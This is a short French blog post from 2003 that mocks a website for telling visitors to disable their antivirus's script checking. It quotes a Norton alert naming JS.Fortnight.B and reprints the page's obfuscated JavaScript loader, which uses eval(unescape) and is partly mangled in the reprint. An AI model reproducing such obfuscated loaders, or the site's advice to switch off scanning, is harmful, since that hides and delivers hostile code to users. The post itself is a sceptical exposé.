---
title: Elle est bien bonne
id: 52
categories:
  - Humeur
date: 2003-11-27 19:44:06
tags:
---

Voici ce qu'on peut lire sur la page d'acceuil de ce [site](http://www.ifrance.com/chlan/).
 > ATTENTION! Si vous disposez d'un anti-virus, il est possible que celui-ci vous dise que les pages de ce site en contiennent, il n'en est rien!!!!
>
>  En effet, les différentes pages contiennent des scripts de copyright, mais certains anti-virus les confondent avec des virus. Pour régler cela, il vous suffit de modifier les paramètres de votre logiciel de protection, en désactivant l'option nécessaire (par exemple "activer la vérification des scripts")

Incroyable n'est-ce pas ?

Et effectivement Norton affiche le message suivant lorsqu'on tente de naviguer sur ce site:
 > Type d'analyse :  Analyse Protection en temps réel
>
>  Evénement :  Virus détecté !
>
>  Nom du virus :JS.Fortnight.B
>
>  Fichier :  C:\Documents and Settings\XXXXX\Local Settings\Temporary Internet Files\Content.IE5\CNDBMYNT\chlan[1](1).htm
>
>  Emplacement :  Quarantaine
>
>  Ordinateur :  XXXXXX
>
>  Utilisateur :  XXXXXX
>
>  Opération :  Nettoyer  - échec : Quarantaine - réussite : Accès refusé
>
>  Date de détection : Thu Nov 27 16:29:26 2003

Quand on examine le code source on trouve un JavaScript assez étrange:
 > &lt;script LANGUAGE="JavaScript"&gt;
>
> dddss="=tdsjqu mbohvbhf&gt;KbwbTdsjqu?=!..gvodujpo ofn(*|sfuvso usvf<a name="&lt;xjoepx/pofssps &gt;G#&lt;wbs u85&lt;em&gt;epdvnfou/mbzfst&lt;eb6#bmm&lt;hf3#hfuFmf.#CzJe&lt;xt&gt;'$tjefcbs{nth&gt;.#c:8&lt;e$qbttxepl(* |u#xsjuf(voftdbqf(%1E%1B)#%4D%3Gcpez%4F0#opgsbnft4#G#iunm6#**&lt;" id="&lt;xjoepx/pofssps &gt;G#&lt;wbs u85&lt;em&gt;epdvnfou/mbzfst&lt;eb6#bmm&lt;hf3#hfuFmf.#CzJe&lt;xt&gt;'$tjefcbs{nth&gt;.#c:8&lt;e$qbttxepl(* |u#xsjuf(voftdbqf(%1E%1B)#%4D%3Gcpez%4F0#opgsbnft4#G#iunm6#**&lt;"> </a>&lt;jg (j$Fwfou*B$dbquvsf;#t(*#/NPVTFVQb#g&amp;pdpoufyunfov(*|fO#dbodfmCvccmf &gt;''&lt;?#;'Wbmv&gt;#gbmt?#Q'2#<a name=",$sjhiudmjdl(f,$(%9#f/xijdi&gt;&gt;3}}/#4* ($fmtfW#^$cvuupo&gt;&gt;3 }} 6# &gt;&gt; 4*  J%&gt;H%mvf&gt;F%  " id=",$sjhiudmjdl(f,$(%9#f/xijdi&gt;&gt;3}}/#4* ($fmtfW#^$cvuupo&gt;&gt;3 }} 6# &gt;&gt; 4*  J%&gt;H%mvf&gt;F%  "> </a><a name="z&amp;poR&amp;&gt;`&amp;&lt; K#npvtfepxo&gt;#&amp;H#&lt;&amp;j(*|jg(eb*G)potfmfdutubsu&gt;O#X+a$" id="z&amp;poR&amp;&gt;`&amp;&lt; K#npvtfepxo&gt;#&amp;H#&lt;&amp;j(*|jg(eb*G)potfmfdutubsu&gt;O#X+a$"> </a>&lt;tfuUjnfpvu(l#-311*&lt;~<a name="&lt;1#R*ot:(*|)+ubuvt &gt; /e#I#-2e#&lt;0#e#pg(j$mpdb;#f+\\$" id="&lt;1#R*ot:(*|)+ubuvt &gt; /e#I#-2e#&lt;0#e#pg(j$mpdb;#f+\\$"> </a>&lt;jg?(A#/qspupdpm/joefyPg(gjmf*!&gt;.2e%c:8!&gt;usvf*|opg(*~<a name="&lt;qbttxepl(*&lt;=0TDSJQU?"; <p>l='\0\t 
>  !"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ</a>[\134](\134)^_`abcdefghijklmnopqrstuvwxyz{|}" id="&lt;qbttxepl(*&lt;=0TDSJQU?";
>
> l='\0\t >  !"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\134](\134)^_`abcdefghijklmnopqrstuvwxyz{|}"> '; eval(unescape("%73%3D%27%27%3B%0D%0A%66%6F%72%20%28%69%3D%30%3B%69%3C%64%64%64%73%73%2E%6C%65%6E%67%74%68%3B%69%2B%2B%29%7B%0D%0A%61%3D%6C%2E%69%6E%64%65%78%4F%66%28%64%64%64%73%73%2E%63%68%61%72%41%74%28%69%29%29%3B%0D%0A%69%66%20%28%61%3D%3D%31%29%20%61%3D%39%3B%0D%0A%69%66%20%28%61%3D%3D%32%29%20%61%3D%31%30%3B%0D%0A%69%66%20%28%61%3D%3D%33%29%20%61%3D%31%33%3B%0D%0A%69%66%20%28%61%3D%3D%34%29%20%61%3D%33%34%3B%0D%0A%69%66%20%28%61%3C%3D%33%31%20%26%20%61%3E%3D%31%34%29%7B%0D%0A%6F%66%66%3D%73%2E%6C%65%6E%67%74%68%2D%28%6C%2E%69%6E%64%65%78%4F%66%28%64%64%64%73%73%2E%63%68%61%72%41%74%28%2B%2B%69%29%29%2D%33%36%2B%39%30%2A%28%6C%2E%69%6E%64%65%78%4F%66%28%64%64%64%73%73%2E%63%68%61%72%41%74%28%2B%2B%69%29%29%2D%33%35%29%29%2D%31%3B%0D%0A%6C%70%3D%6F%66%66%2B%61%2D%31%34%2B%34%3B%0D%0A%73%3D%73%2B%73%2E%73%75%62%73%74%72%69%6E%67%28%6F%66%66%2C%6C%70%29%3B%7D%0D%0A%65%6C%73%65%20%7B%20%69%66%20%28%61%3E%3D%34%31%29%20%61%3D%61%2D%31%3B%20%73%3D%73%2B%6C%2E%63%68%61%72%41%74%28%61%29%3B%7D%7D%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%73%29%3B%0D%0A"));
>
> > <p>
> >
> > &lt;/SCRIPT&gt;
> >
> > Pourquoi avoir offusqué celui-ci et pas les autres ? Etrangement c'est justement celui qui fait tiquer l'antivirus…</p>
